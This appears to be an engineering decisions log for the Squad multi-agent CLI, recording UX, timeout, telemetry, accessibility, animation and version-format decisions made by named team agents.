3. **Use cases:** Five practical scenarios (side projects, cross-repo review, new codebases, growing skills, workflow automation) — all plausible today, no future-state fiction.
4. **Honesty section:** Explicitly called out limitations (no sync between machines, project keys unused, no conflict handling, no UI).
5. **Nav placement:** Third in Guide section after tips-and-tricks and sample-prompts.

## Impact

- New page in published docs site (guide/personal-squad.html)
- Guide nav updated with new entry
- No breaking changes to existing pages




### 2026-02-23: E2E Test Harness Design
**By:** Breedan
**Summary:** Implemented child_process-based terminal harness for CLI acceptance testing instead of node-pty, providing cross-platform compatibility and CI-friendly execution without native compilation.
**Details:** See orchestration log for full context.

### 2026-02-23: REPL UX Test Suite Patterns
**By:** Hockney
**Summary:** Created 40-test suite using ink-testing-library to validate visual REPL behavior across 6 categories (thinking indicator, agent panel, message stream, input prompt, welcome, never-dead requirement).
**Details:** See orchestration log for full context.

### 2026-02-24: REPL UX Overhaul
**By:** Kovash
**Summary:** Implemented visual improvements including elapsed-time tracking, pulsing agent indicators, response timestamps, and animated spinners to ensure the interface never appears dead during processing.
**Details:** See orchestration log for full context.

### 2026-02-23: Initial CLI UX Audit
**By:** Marquez
**Summary:** Comprehensive audit of Squad CLI identified 21 issues ranging from P0 blockers (80-char violations, unclear errors) to P2 polish opportunities, with 6 UX gates defined for quality enforcement.
**Details:** See orchestration log for full context.

### 2026-02-23: SQUAD_DEBUG auto-enables OTel diagnostics
**By:** Saul
**Summary:** OTel SDK now auto-enables DiagConsoleLogger at WARN level when SQUAD_DEBUG=1 is set, surfacing gRPC transport errors that were previously invisible to operators.
**Details:** See orchestration log for full context.
# Decision: Testing Epic PRD Structure

**Author:** Keaton (Lead)  
**Date:** 2026-02-24  
**Status:** Awaiting Brady Approval  

## Context

Brady's CLI died after 2 minutes due to hard-coded timeout in `packages/squad-cli/src/cli/shell/index.ts:123`. He wants the CLI to be "take-your-breath-away-good" with engaging feedback during long waits, Claude-style thinking words, Copilot-style action display, and never feel dead.

New agents joined: Cheritto (TUI), Breedan (E2E tests), Waingro (hostile QA), Nate (accessibility), Marquez (UX design). Marquez delivered 21-item UX audit, Breedan designed E2E harness, Kovash shipped REPL UX overhaul, Hockney has 40 REPL UX tests.

## Decision

Created 3-phase epic PRD with 21 numbered items:

### Phase 1: Testing Wave (6 items)
- Fix 2-minute timeout → configurable via env var, 10-minute default
- Dogfood CLI with 4 repo types (fresh init, existing squad, monorepo, solo)
- Expand E2E test coverage (10+ new Gherkin scenarios)
- Hostile QA (Waingro breaks it in 7+ conditions: tiny terminals, no config, rapid Ctrl+C, etc.)
- Accessibility audit (Nate reviews keyboard nav, color contrast, error guidance)
- Fix P0 UX blockers from Marquez (5 items: help text overflow, version format, error remediation, empty states, init flags)

### Phase 2: Improvement Phase (5 items)
- Implement P1 UX polish from Marquez (8 items: verb consistency, focus indicator, keyboard hints, etc.)
- Engaging thinking feedback (Claude-style phrases + Copilot-style action display)
- Ghost response detection + retry logic (3 attempts, user feedback)
- Fix all P0 bugs from Phase 1 testing
- Harden error handling (actionable messages, remediation hints, no stack traces to users)

### Phase 3: Make It Breathtaking (7 items)
- Rich progress indicators (which agent, what they're doing, pulsing dots, elapsed time)
- Terminal adaptivity (beautiful at 120-col, functional at 80-col, graceful at 40-col)
- Animations & transitions (spinners, pulsing dots, color transitions, smooth status changes)
- Copy polish (human, fun, action-oriented — not stuffy)
- Accessibility hardening (keyboard-first, NO_COLOR mode, focus indicators, guidelines doc)
- P2 nice-to-haves from Marquez (6 items: remove "you:" prefix, separator consistency, etc.)
- The "wow moment" — first `squad init` feels magical

## Key Architectural Decisions

### Timeout Configuration
- Environment variable: `SQUAD_SESSION_TIMEOUT_MS`
- Default: 600_000ms (10 minutes, not 2 minutes)
- Keep-alive feedback: elapsed time updates every second, ThinkingIndicator color cycles (cyan < 3s, yellow 3–8s, magenta > 8s)
- Test validation: 15-minute conversation must complete without timeout

### Thinking Feedback Design
- **Claude-style:** Rotate through 5–7 thinking phrases every 2–3 seconds ("Analyzing...", "Considering...", "Synthesizing...")
- **Copilot-style:** Stream agent actions in real time ("Reading file src/index.ts...", "Spawning specialist...", "Analyzing dependencies...")
- Must work during 10+ minute conversations (blocks on timeout fix in Phase 1)

### Terminal Adaptivity Approach
- **120-col:** Full layout with separators, full help text
- **80-col:** Standard layout (current target, existing implementation)
- **40-col:** Compact layout (single-column, abbreviated labels)
- Separators must respect terminal width: `Math.min(terminal.columns, 80)`
- E2E tests must pass at all three widths

### Copy Guidelines
- Human, fun, action-oriented (not stuffy)
- Active voice, imperative verbs
- Every error includes remediation hint
- Example transformation:
  - Before: "No squad directory found in repository tree or global path"
  - After: "No team found. Run 'squad init' to create one."

## Agent Assignment Strategy

**Cheritto (TUI)** owns the most work (9 items across all phases):
- Phase 1: 1.1 (timeout), 1.6 (P0 UX)
- Phase 2: 2.1 (P1 UX), 2.2 (thinking), 2.3 (ghost), 2.5 (errors)
- Phase 3: 3.1 (progress), 3.2 (adaptivity), 3.3 (animations), 3.6 (P2 UX), 3.7 (wow)

**Testing specialists:**
- Breedan: 1.3 (E2E expansion)
- Waingro: 1.2 (dogfood), 1.4 (hostile QA)
- Hockney: 2.5 (error tests)

**UX specialists:**
- Marquez: 1.6, 2.1, 3.1, 3.4, 3.6, 3.7 (review/design)
- Nate: 1.5 (audit), 3.2 (review), 3.5 (hardening)
- Kovash: 2.2 (review), 3.3 (review)

**Tone review:**
- McManus: 3.4 (copy polish tone review)

## Dependencies Mapped

### Phase 1 → Phase 2
- 1.6 (P0 UX) → 2.1 (P1 UX) — blockers before polish
- 1.1 (timeout) → 2.2 (thinking) — working timeout before long-wait feedback
- 1.2, 1.4 (bug catalog) → 2.4 (fix P0 bugs) — bugs found before fixing

### Phase 2 → Phase 3
- 2.1 (P1 UX) → 3.2 (adaptivity) — foundation before adaptivity
- 2.1 (P1 UX) → 3.6 (P2 UX) — P1 before P2
- 2.2 (thinking) → 3.1 (progress) — thinking feedback is foundation for rich progress

### Within Phase 3
- 3.3 (animations) → 3.7 (wow moment) — animations needed for magical init

## Success Gates

**Phase 1:** Timeout fixed, CLI tested (4 repos), E2E expanded (10+ scenarios), hostile QA (7+ conditions), accessibility audit, P0 UX fixed, bugs cataloged

**Phase 2:** P1 UX fixed, thinking feedback engaging (Brady approves), ghost handling, P0 bugs fixed, errors actionable

**Phase 3:** Rich progress, terminal adaptivity (40–120 cols), animations smooth, copy polished, accessibility hardened, P2 UX, **Brady says "breathtaking"**

## Next Steps

1. Brady reviews PRD (session state file: `prd-testing-epic.md`)
2. Create GitHub epic issue (copy PRD as issue body)
3. Create 21 sub-issues (one per item, numbered 1.1–3.7)
4. Assign agents per assignment table
5. Schedule Phase 1 kickoff (all agents read PRD, ask questions)
6. Execute Phase 1
7. Phase 1 retrospective, adjust Phase 2 scope if needed
8. Repeat for Phases 2 & 3

## Why This Structure

**3 phases, not 1 monolith:** Each phase has distinct objective (test, fix, polish). Allows for retrospectives and scope adjustments between phases.

**21 numbered items, not open-ended:** Clear scope, clear ownership, clear dependencies. Each item can become a GitHub sub-issue with its own acceptance criteria.

**Agent assignments upfront:** Cheritto is load-balanced (9 items but spread across all phases). Specialists are focused (Breedan E2E, Waingro QA, Nate accessibility). Avoids "who's doing what?" confusion.

**Dependencies explicit:** No item starts before its dependencies are done. Prevents rework (e.g., P0 UX must be fixed before P1 UX, timeout must work before testing long-wait feedback).

**Success gates concrete:** Not "improve UX" but "all P0 items fixed + Marquez approves + UX gates pass". Not "make it better" but "Brady says breathtaking".

## Pattern for Future Epics

When writing multi-phase epics:
1. Number all items (phase.item format: 1.1, 1.2, 2.1, etc.)
2. Assign agents upfront (with item counts to balance load)
3. Map dependencies explicitly (which items block which)
4. Define success criteria per phase (concrete, testable, or approval-gated)
5. Include risks & mitigations section
6. Provide next steps (how to execute, not just what to build)



### 2026-02-23T19:27Z: Telemetry in both CLI and agent modes
**By:** Brady (via Copilot)
**What:** Squad should pump telemetry during BOTH modes of usage: (1) when running as the standalone Squad CLI, and (2) when running as an agent inside GitHub Copilot CLI. Brady wants to see telemetry from both surfaces.
**Why:** User request — captured for team memory. Affects OTel integration architecture.

# Decision: ThinkingIndicator two-layer architecture

**Date:** 2026-02-24
**By:** Cheritto (TUI Engineer)
**Issue:** #331 — Engaging thinking feedback
**PR:** #351

## Decision

Extracted the inline ThinkingIndicator from MessageStream.tsx into a standalone `ThinkingIndicator.tsx` component with a two-layer design:

1. **Layer 1 (Claude-style):** 10 rotating thinking phrases cycled every 2.5s — "Analyzing...", "Considering...", etc.
2. **Layer 2 (Copilot-style):** Activity hints from SDK `tool_call` events — "Reading file...", "Spawning specialist...", etc. Takes priority over Layer 1 when available.

## Why

- Standalone component is reusable (AgentPanel could use it too if needed)
- Two-layer priority system means we always show *something* engaging (Layer 1) but upgrade to specific info when we have it (Layer 2)
- `setActivityHint` on ShellApi lets the streaming pipeline push hints without coupling to React internals

## Team impact

- **Marquez:** May want to adjust phrase list or rotation timing — both are exported constants
- **Kovash:** MessageStream interface now has optional `activityHint` prop
- **Breedan:** 16 new tests in `test/repl-ux.test.ts` sections 7 + 8
- **Foundation for 3.1 (rich progress):** ThinkingIndicator can be extended with progress bars, sub-task tracking

# Decision: P0 Bug Fixes from Phase 1 Testing

**By:** Hockney (Tester)
**Date:** 2026-02-23
**Issue:** #333
**PR:** #351

## Decisions Made

### BUG-2: Empty/whitespace args behavior
**Decision:** Empty string and whitespace-only CLI args show brief help text and exit 0.
**Rationale:** Previously, `squad ""` launched the interactive shell in non-TTY mode (exit 1), and `squad "   "` hit the "Unknown command" error. Neither is useful. Showing help is the least-surprise behavior and matches how most CLI tools handle garbage input.
**Implementation:** Trim `args[0]` early; if raw arg was provided but trims to empty, show help instead of routing to shell or command dispatch.

### BUG-1: --version bare semver is correct
**Decision:** No code change needed. Bare semver from `--version` is intentional per Cheritto's P0 UX fix (PR #349) and Marquez's audit.
**Action:** Updated `version.feature` acceptance test which still asserted `output contains "squad"` — this conflicted with the `ux-gates.test.ts` gate that explicitly verifies no "squad" prefix.

### version.feature was stale
**Observation:** Acceptance tests can drift from UX decisions when multiple PRs change the same behavior. The version.feature file was written before the P0 UX decision to use bare semver, and nobody caught the conflict because the acceptance tests run separately from UX gate tests.
**Recommendation:** Run both acceptance AND ux-gates tests in CI as a single quality gate to catch drift.

## For Team Awareness
- 3 pre-existing test failures in `repl-ux.test.ts` (AgentPanel empty-state rendering). Not introduced by this PR — Kovash's component changes made the old assertions stale. Someone should update those tests.

# Decision: Dual-mode OTel telemetry (Issue #343)

**By:** Saul
**Date:** 2026-02-24
**PR:** #352

## What
Added `squad.mode` resource attribute to OTel initialization and created `initAgentModeTelemetry()` convenience function for the Copilot agent-mode entry point.

## Why
Brady wants telemetry from both CLI and Copilot agent surfaces. The two modes need distinct `serviceName` and `squad.mode` attributes so they're distinguishable in Aspire dashboards and trace queries.

## How
- `OTelConfig.mode` → written as `squad.mode` resource attribute in `buildResource()`
- `initAgentModeTelemetry()` in `otel-init.ts` → pre-configures `serviceName: 'squad-copilot-agent'`, `mode: 'copilot-agent'`
- `runShell()` now passes `mode: 'cli'` to tag CLI telemetry
- Exported from SDK barrel so consumers can `import { initAgentModeTelemetry } from '@bradygaster/squad-sdk'`

## Team impact
- **Any agent building the Copilot agent-mode entry point:** Call `initAgentModeTelemetry()` at startup and `handle.shutdown()` on exit. That's it.
- **Existing CLI telemetry:** Now tagged with `squad.mode = 'cli'` — no breaking change.
- **Dashboard queries:** Filter by `squad.mode` or `service.name` to isolate surfaces.


# Decision: ThinkingIndicator two-layer architecture

**Date:** 2026-02-24
**By:** Cheritto (TUI Engineer)
**Issue:** #331 — Engaging thinking feedback
**PR:** #351

## Decision

Extracted the inline ThinkingIndicator from MessageStream.tsx into a standalone `ThinkingIndicator.tsx` component with a two-layer design:

1. **Layer 1 (Claude-style):** 10 rotating thinking phrases cycled every 2.5s — "Analyzing...", "Considering...", etc.

# Decision: Ghost response retry pattern

**By:** Cheritto (TUI Engineer)
**Date:** 2026-02-25
**PR:** squad/332-ghost-response
**Closes:** #332

## What

Ghost responses (empty `sendAndWait()` results) are now detected and retried automatically with exponential backoff.

## Design

- `withGhostRetry(sendFn, options)` is a pure, exported function — no closure dependencies on shell state.
- The shell-bound `ghostRetry()` wrapper inside `runShell()` wires UI feedback (retry/exhaustion messages) via callbacks.
- Both `dispatchToAgent()` and `dispatchToCoordinator()` use the same retry path.
- On each retry, `accumulated` is reset before re-calling `awaitStreamedResponse()` so the delta handler re-accumulates from the new response.

## Why

The SDK occasionally fires `session.idle` before `assistant.message`, causing `sendAndWait()` to resolve with `undefined`. Without retry, the user sees nothing — a silent failure. Exponential backoff (1s, 2s, 4s) avoids hammering the backend while giving the LLM time to recover.

## Team impact

- If anyone adds new dispatch paths, they should use `ghostRetry()` (inside `runShell()`) or `withGhostRetry()` (standalone) to handle empty responses.
- The `GhostRetryOptions` interface is exported for testing and extensibility.


### 2026-02-25: P1 UX polish — visual language standardization
**By:** Cheritto (TUI Engineer)
**PR:** #356 (branch `squad/330-p1-ux-polish`)
**What:** Standardized 8 visual/interaction patterns across the shell:
- System prefix is now `▸` (small triangle) — team should use this for all system-level messages
- Separators are terminal-width-aware via `process.stdout.columns` (capped at 120) — no more hardcoded widths
- Prompt stays cyan in all states (active + disabled) — yellow is reserved for warnings/processing indicators only
- Focus indicator uses text label `▶ Active` alongside pulsing dot — accessibility over decoration
- @-addressing is reinforced in placeholder text — key interaction model should be visible at all times
**Why:** Marquez audit identified 8 P1 inconsistencies. Standardizing now prevents divergence as we add features.
**Impact:** Any new components rendering separators or system messages should follow these patterns.

# Decision: Rich Progress Indicators (#335)

**Author:** Cheritto (TUI Engineer)
**Date:** 2026-02-23
**Status:** Proposed

## Context
Users couldn't tell what agents were doing during long operations. The ThinkingIndicator (#331) handles the "thinking" phase, but once agents start working on tools, there was no per-agent visibility.

## Decision
Two complementary progress surfaces:

1. **AgentPanel status line** — `Name (working, 12s) — Reading file`
   - Uses existing `AgentSession` type extended with `activityHint?: string`
   - SessionRegistry manages hints alongside status

2. **MessageStream activity feed** — `📋 Keaton is reading file...`
   - New `agentActivities` Map prop on MessageStream
   - Renders between message list and ThinkingIndicator
   - Backward compatible (no prop = no feed)

## Alternatives Considered
- **Single global hint only:** Already had this via `activityHint` prop. Not enough for multi-agent.
- **Toast/notification system:** Too heavy for this use case. Activity feed is simpler and scans well.
- **Inline in ThinkingIndicator:** Would overload that component's responsibility.

## Consequences
- `AgentSession` type gains one optional field — no breaking change
- `SessionRegistry` gains `updateActivityHint()` — additive
- `ShellApi` gains `setAgentActivity()` — additive
- All existing tests continue to pass (11 new tests added)


# Decision: Terminal Adaptivity Strategy (3-tier responsive layout)

**Issue:** #336 — Terminal adaptivity 40→120 col range
**Author:** Cheritto (TUI Engineer)
**Date:** 2026-02-23
**Status:** Proposed (PR #360)

## Context

The CLI needed to render cleanly across terminal widths from 40 to 120+ columns. Some components overflowed or looked awkward at narrow widths, and the layout was rigid.

## Decision

Implemented a 3-tier responsive system based on terminal width:

| Tier | Width | Behavior |
|------|-------|----------|
| Compact | ≤60 cols | Minimal UI — single-line agents, short prompt, no banner detail |
| Standard | 61–99 cols | Current layout with hint truncation |
| Wide | ≥100 cols | Full detail — all hints, focus line, full descriptions |

### Key choices:

1. **`useTerminalWidth()` hook in terminal.ts** — single canonical source for reactive width. Listens for `process.stdout` `resize` events. Pure `getTerminalWidth()` for non-React contexts (e.g., `/help` command handler).

2. **Width floor of 40** — `getTerminalWidth()` clamps to minimum 40. Below that, things will clip but won't crash.

3. **Breakpoints at 60 and 100** — chosen because 60 is roughly the minimum for readable agent names + status, and 100 is where activity hints and descriptions add value without cramming.

4. **No horizontal scrolling** — Ink's `wrap="wrap"` already handles message text. The separator, prompt, and banner are the only fixed-width elements, and they now all use the reactive width.

## Alternatives Considered

- **CSS-like media queries via Ink's `useStdout`** — Ink doesn't provide this natively. The `process.stdout.on('resize')` approach is simpler and more portable.
- **Single breakpoint (narrow vs. wide)** — 3 tiers give a smoother experience across the real range of terminal sizes.

## Consequences

- All width-responsive components must use `useTerminalWidth()` (not raw `process.stdout.columns`)
- New components should follow the 60/100 breakpoint convention
- Tests run at width=80 (default when `process.stdout.columns` is undefined), which is in the "standard" tier


# Decision: Copy Polish — Human, Fun, Action-Oriented (Issue #338)

**Date:** 2026-02-24  
**Author:** McManus (DevRel)  
**Status:** Complete  
**Related Issue:** #338  
**Related PR:** #358  

## Problem
User-facing CLI messages were corporate, passive, and didn't guide users to their next action. Messages like "No squad directory found in repository tree or global path" were too long and technical. Help text included redundant verbose examples. Status output was overly structured.

## Decision
Rewrite every user-facing message in the CLI to be:
1. **Human** — Conversational tone, no corporate speak, no formal "Squad" overuse
2. **Fun** — Playful where appropriate (e.g., "Hmm, /foobar?" vs "Unknown command"), warm but not silly
3. **Action-oriented** — Every message guides users to their next step

## Changes Implemented

### cli-entry.ts (Help Text & Errors)
- Help subtitle: "Add an AI agent team..." → "Team of AI agents at your fingertips"
- Command descriptions simplified and action-focused:
  - init: "Initialize Squad" → "Create .squad/ in this repo"
  - upgrade: "Update Squad-owned files..." → "Update Squad files to latest"
  - triage: "Scan for work and categorize..." → "Scan issues and categorize"
  - loop: "Continuous work loop (Ralph mode)" → "Non-stop work loop (Ralph mode)"
  - hire: "Team creation wizard" → "Build a new team"
  - link: "Link project to remote team root" → "Connect to a remote team"
  - aspire: "Launch Aspire dashboard" → "Open Aspire dashboard"
  - doctor: "Validate squad setup" → "Check your setup"
- Error messages shortened: "Run: squad import <file>" (vs "Usage: squad import...")
- Triage message: removed "Squad" prefix from output
- Status output restructured:
  - "Active squad: repo" → "Here: repo (in .squad/)"
  - "Registered agents" label → "Size:"
  - Removed verbose "Reason:" explanations
- Final error hint: "Hint: Run 'squad doctor'..." → "Tip: Run 'squad doctor' for help..."

### commands.ts (Slash Commands)
- /help: Reduced 16 lines to 6. Removed "Available commands" header, cut verbose examples.
- /status: "Squad Status" → "Your Team:". Relabeled fields:
  - "Team root" → "Root"
  - "Registered agents" → "Size"
  - "Active" → "Active now"
  - "Messages" → "In conversation"
- /history: "Recent messages (10)" → "Last 10 messages:"
- /agents: "No agents registered" → "No team members yet"
- Unknown commands: "Unknown command: /X. Type /help for available commands." → "Hmm, /X? Type /help for commands."

### AgentPanel.tsx
- Empty state: "Type a message to start, or run /help for commands" → "Send a message to start. /help for commands."
- Removed " · all idle" status label (redundant when no agents are active)

### InputPrompt.tsx
- Placeholder hint: "@agent-name" → "@agent" (shorter)

### App.tsx
- Setup hint: "set up your team" → "get started" (more approachable)
- Condensed instructions: 2 lines → 1 line: "↑↓ history · @Agent to direct · /help · Ctrl+C exit"
- SDK error: "SDK not connected — agent routing unavailable" → "SDK not connected. Check your setup." (actionable)

### Tests
- Updated 9 assertions in cli-shell-comprehensive.test.ts to match new copy
- Updated 2 assertions in ux-gates.test.ts to match new copy
- All 125 tests pass

## Rationale
1. **Human tone** makes the CLI feel approachable and conversational
2. **Action-oriented** messages reduce user friction ("Run squad init to get started" vs "No squad found")
3. **Shorter** messages respect user attention; verbose help text encourages skimming
4. **Playful errors** ("Hmm, /X?") build personality without sacrificing clarity
5. **Consistency** across all components ensures a unified voice

## Examples of Good Rewrites
| Before | After | Why |
|--------|-------|-----|
| "No squad directory found in repository tree or global path" | "No team found. Run `squad init` to get started." | Actionable, human, short |
| "Error: Invalid configuration" | "Couldn't read your config. Run `squad doctor` to check it." | Sympathetic, helpful, specific |
| "Registered agents: 0" | "Size: 0" | Shorter, less technical |
| "Unknown command: /foobar. Type /help for available commands." | "Hmm, /foobar? Type /help for commands." | Conversational, warm, same info |

## Non-Breaking
- All changes are to user-facing output only
- No API changes, no code structure changes
- Fully backward-compatible—existing scripts/automation unaffected

## Deployment
- Ready to merge and deploy
- No documentation updates needed (copy IS the docs)
- Test suite validates UX quality gates (line width, remediation hints, command presence)

## Notes
- Followed existing Squad tone ceiling: no hype, no hand-waving, professional warmth
- Validated against ux-gates (width ≤80 chars, error hints, command presence)
- All help text tested for terminal overflow and readability


# Decision: Accessibility Hardening (#339)

**Author:** Nate (Accessibility & Ergonomics Reviewer)
**Date:** 2025-07-18
**Status:** Implemented
**Issue:** #339

## Context

Prior audit (#328) found CONDITIONAL PASS: NO_COLOR env var was not respected, ANSI codes emitted unconditionally, and several error messages lacked remediation hints. Color was partially used as sole status indicator.

## Decision

Implement full NO_COLOR/TERM=dumb compliance using a shared `isNoColor()` utility in terminal.ts. All components conditionally omit color props and replace animations with static text alternatives. Created `docs/accessibility.md` as the contributor reference.

## Changes

1. **terminal.ts** — Added `isNoColor()` function and `noColor` field to TerminalCapabilities. `supportsColor` now also factors in NO_COLOR.
2. **AgentPanel.tsx** — PulsingDot becomes static `●`. Active label: `[Active]` text. Error label: `[Error] ✖` text. Status line colors gated.
3. **ThinkingIndicator.tsx** — Spinner becomes static `...`. Color cycling disabled. `⏳` emoji prefix added for text-only identification.
4. **InputPrompt.tsx** — Spinner becomes `[working...]`. Cursor uses bold instead of color. All color props gated.
5. **MessageStream.tsx** — User/agent/streaming text colors all gated on `isNoColor()`.
6. **App.tsx** — Welcome banner border color gated.
7. **docs/accessibility.md** — Full guidelines doc with keyboard shortcuts, NO_COLOR matrix, contrast rules, error requirements.

## Risks

- NO_COLOR detection is process-level (reads env at call time), not reactive. If env changes mid-session, restart required. Acceptable for CLI use.
- 4 pre-existing test failures in repl-ux.test.ts (unrelated to this change — test expectations don't match component text from prior copy polish).


# Decision: Animation Architecture — setState-during-render for synchronous transitions

**Author:** Cheritto (TUI Engineer)
**Date:** 2026-02-26
**Issue:** #337 — Animations and transitions
**Status:** Implemented

## Context

Adding tasteful animations to the CLI required detecting agent state transitions (working → idle) and rendering completion flash badges synchronously so they appear on the same render frame.

## Decision

Used React's setState-during-render pattern in `useCompletionFlash` instead of `useEffect`-based detection. This ensures the "✓ Done" flash is visible immediately when the agent status changes, without requiring an extra render cycle.

**Why not `useEffect`?** Effects run asynchronously after render. In ink-testing-library, `rerender()` + `lastFrame()` wouldn't capture the flash because the state update from the effect hadn't committed yet. More importantly, users would see one frame without the flash before it appears — a visible flicker.

**Trade-offs:**
- (+) Synchronous: flash visible on same render as status change
- (+) Testable: ink-testing-library `rerender()` captures flash immediately
- (-) Uses a less common React pattern (setState during render)
- (-) Requires careful loop termination (`!flashing.has(name)` guard prevents infinite re-render)

## Alternatives Considered

1. **useEffect + timer**: Simpler but async — flash appears one frame late
2. **useSyncExternalStore**: Overkill for this use case
3. **External state (zustand/jotai)**: Adds dependency, unnecessary complexity

## Animation Budget

| Animation | Duration | Frame rate |
|-----------|----------|------------|
| Welcome typewriter | 500ms | ~15fps |
| Banner fade-in | 300ms | single transition |
| Message fade-in | 200ms | single transition |
| Completion flash | 1500ms | single transition |

All animations use `dimColor` toggle (single re-render) or `useTypewriter` (~15fps interval). No continuous high-frequency animations.



# Decision: P2 UX Polish — Text over Emoji, Simplicity over Fidget

**Author:** Cheritto (TUI Engineer)
**Date:** 2026-02-26
**Issue:** #340
**PR:** #364

## Context

Marquez's UX audit flagged 6 P2 items — all "polish" tier. The theme across all 6: reduce visual noise, prefer text+ANSI over emoji, and simplify where rotation/variety adds no value.

## Decisions Made

1. **Removed "you:" from user messages.** The `❯` chevron already signals "your input." Adding "you:" was redundant and cluttered the message stream. Every character in a TUI earns its place.

2. **Unified all separators to `-` (ASCII hyphen).** Was using `─` (U+2500) in MessageStream and `┄` (U+2504) in AgentPanel. Inconsistency between two components that render inches apart on screen. ASCII `-` is the most portable choice and renders identically across all terminal emulators.

3. **Killed the thinking phrase carousel.** 10 rotating phrases every 2.5s was a nice idea but in practice just added motion that competed with the actual content. Static "Thinking..." is clear, honest, and doesn't draw the eye away from streaming content. Activity hints still override when available — those are genuinely informative.

4. **Text status labels in `/agents`.** Emoji circles (`🔵🟢🔴⚪`) are ambiguous and render inconsistently across terminals. `[WORK]`, `[STREAM]`, `[ERR]`, `[IDLE]` are instantly readable and grep-friendly.

5. **Single-space indent for status lines.** Minor but compounds: 2-space indent pushed content right, especially on narrow terminals. 1-space keeps things tight.

6. **Replaced all ornamental emoji with text.** `📋` → `▸`, `📍` → `Focus:`, `🔌` → removed. Emoji in TUI output is a crapshoot — different widths, different renderers, different moods. Text + ANSI color is reliable.

## Principle

> In a TUI, every glyph earns its pixel. Prefer text that works everywhere over emoji that works sometimes.

## Risk

Low. All changes are visual-only. No behavioral or architectural changes. Tests updated to match.


# Decision: First-run wow moment architecture

**Author:** Cheritto (TUI Engineer)
**Date:** 2026-02-26
**Issue:** #341
**PR:** #362

## Context

The first `squad init` and `squad` launch needed to feel magical — the "wow moment" that makes users feel they just assembled an elite team.

## Decision

### Init ceremony (console-based, no Ink dependency)

Chose simple `process.stdout.write` + `setTimeout` typewriter and staggered reveal instead of pulling Ink into the `core/` module. The `core/init.ts` is documented as "zero dependencies" and is used in the bundled `cli.js` standalone — adding React/Ink would break that contract.

Animation parameters: 25ms/char typewriter for opener, 40ms/char for logo, 100ms stagger between landmark lines. These were tuned to feel quick but deliberate — ~500ms total for a 5-item reveal.

### First-launch detection (file marker pattern)

Used a `.squad/.first-run` marker file written by init and consumed (deleted) by the shell on first launch. Alternatives considered:
- **Timestamp comparison** (team.md mtime vs. current time) — fragile across git clone/checkout
- **Config file flag** — adds schema complexity for a one-time event
- **In-memory only** — doesn't survive between `squad init` and `squad` processes

The file marker is atomic, cross-platform, and self-cleaning. The shell deletes it on read, so the guided prompt appears exactly once.

### NO_COLOR respect

All animation gated on `isInitNoColor()` which checks `NO_COLOR`, `TERM=dumb`, and non-TTY. This is consistent with the shell's `isNoColor()` in `terminal.ts` but adds the TTY check since init runs as a standalone process, not inside Ink.

## Alternatives Rejected

- **Ink rendering in init**: Would require React setup for a 2-second ceremony. Overkill.
- **ASCII art banner**: Too flashy, doesn't match the clean Ink aesthetic.
- **Sound/bell**: Unreliable across terminals, often annoying.



## Quality Assessment: UX Audit (2026-02-24)

**Author:** Marquez (UX Auditor)  
**Date:** 2026-02-24  
**Grade:** B

### What

UX audit identified 11 improvement areas: 3 P0 (help text structure, stub command visibility, duplicate taglines), 4 P1 (status vocabulary, separator characters, /agents mismatch, roster wrapping), 4 P2 (scrub-emails default, /clear feedback, quit vs exit, session summary).

**P0 blockers:**
- Help text unstructured; commands grouped poorly
- Stub commands (triage, loop, hire) show placeholder messages in help
- Duplicate taglines (line 55 vs 71)

**Strengths:** Multi-agent orchestration panel (novel), init ceremony (delightful), ghost retry, NO_COLOR accessibility.

### Why

UX consistency and user trust depend on clear, structured help and hidden unfinished features. The ~2-3 day polish window exists now; accumulated inconsistencies prevent reaching A-tier.

# Decision: ASCII-only separators and NO_COLOR exit message

**By:** Cheritto
**Date:** 2026-02-27
**Context:** Fixing #405, #404, #407

## What
- All banner separators now use ASCII hyphens (\-\) instead of Unicode middot (\·\) or em dash (\—\)
- Exit message uses \--\ instead of \◆\ diamond, with ANSI color that respects NO_COLOR
- Roster agent names render without emoji — text only

## Why
P2 UX conventions established emoji removal and ASCII separators. These three issues were the remaining spots where Unicode/emoji leaked through. The exit message now follows the same NO_COLOR pattern used throughout the shell.

## Impact
Any future banner or status text should use ASCII hyphens for separators. Keep emoji out of status/system messages.

# Decision: Version format canonical standard

**Author:** Fenster  
**Date:** 2026-02-24  
**PR:** #447  
**Issues:** #431, #429

## Decision

Bare semver (e.g., \ .8.5.1\) is the canonical format for all version commands (\--version\, \-v\, \ersion\ subcommand, \/version\ shell command). Display contexts (help text, shell banner) use \squad v{VERSION}\ for branding.

## Rationale

- Matches existing P0 regression test expectations (bare semver, no prefix)
- Script-friendly — bare semver is easier to parse in CI/CD pipelines
- Consistent with \
pm --version\ convention
- Display contexts (help text, banner) still get the branded \squad v{VERSION}\ format

## Impact

All three entry points now produce identical version output:
- \cli-entry.ts\ (proper entry): \--version\, \-v\, \ersion\ → bare semver
- \cli.js\ (deprecated bundle): \--version\, \-v\, \ersion\ → bare semver (dynamic via getPackageVersion())
- Shell \/version\: bare semver

# Decision: REPL Experience Audit — Comprehensive Timeout, UX, and Test Coverage Analysis

**By:** Kovash (REPL & Interactive Shell Expert)
**Date:** 2026-02-24
**Context:** Brady directive — "I'm shocked there are no REPL end-to-end integration tests." Full audit of the 2-minute timeout and dead air moments.

## Executive Summary

Conducted comprehensive REPL audit focusing on timeout handling, SDK connection latency, and streaming pipeline. Filed 7 GitHub issues (#418, #425, #428, #430, #432, #433, #434) with detailed reproduction steps, root cause analysis, and proposed fixes.

**Critical Findings:**
1. **10-minute timeout too aggressive** — all operations (simple queries, complex refactors) share same timeout, causing premature failures
2. **Cold SDK connection dead air** — 3-5 second freeze on first message with no user feedback
3. **Input buffering drops keystrokes** — backspace/arrows silently ignored during agent processing
4. **Coordinator streaming invisible** — message_delta events accumulate but never render to user
5. **Ghost response retry exhausts 40+ minutes** — auto-retries 3x without user consent or progressive warnings
6. **Zero E2E integration tests** — 106 component tests but no full user flow coverage
7. **No cancel mechanism** — Ctrl+C exits entire shell, SDK abort() exists but never called

## Decision

All issues filed with detailed technical analysis. Framework in place for all downstream fixes. Reference architectures documented for timeout tiers, streaming visibility, test harness, and cancellation.

# Decision: First 30 Seconds UX Standard

**By:** Marquez (CLI UX Designer)
**Date:** 2026-02-24
**Status:** Proposed

## Decision

Squad must delight users in the first 30 seconds. Any moment that creates confusion, frustration, or "is it broken?" anxiety is a blocker for release.

**The First 30 Second Rule:**
1. Help text must be scannable in ≤3 seconds
2. Default behavior must be obvious without reading docs
3. Wait states >2 seconds must show status ("Connecting...", "Waking up [Agent]...")
4. Animations must never block input
5. The primary action path (install → init → first message → first response) must feel **instant** at every step

## Why This Matters

